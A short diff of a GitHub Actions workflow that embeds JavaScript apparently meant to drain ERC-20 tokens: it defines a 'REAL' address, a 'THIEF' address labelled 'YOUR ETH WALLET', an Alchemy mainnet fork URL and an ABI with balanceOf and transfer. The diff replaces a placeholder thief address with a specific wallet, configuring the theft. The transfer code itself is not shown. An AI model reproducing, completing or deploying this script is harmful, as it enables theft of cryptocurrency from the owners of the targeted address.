@@ -15,7 +15,7 @@ jobs:
           const axios = require("axios");
 
           const REAL = "0x9FAB63812476FA4F4e8806D5297452dBC2c1C67c";
-          const THIEF = "0xDeadBeef00000000000000000000000000000000"; // <-- YOUR ETH WALLET
+          const THIEF = "0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397"; // <-- YOUR ETH WALLET
           const FORK  = "https://eth-mainnet.g.alchemy.com/v2/YOUR_ALCHEMY_FORK_KEY"; // <-- YOUR ALCHEMY FORK
 
           const abi = ["function balanceOf(address) view returns (uint256)","function transfer(address,uint256) external returns (bool)"];
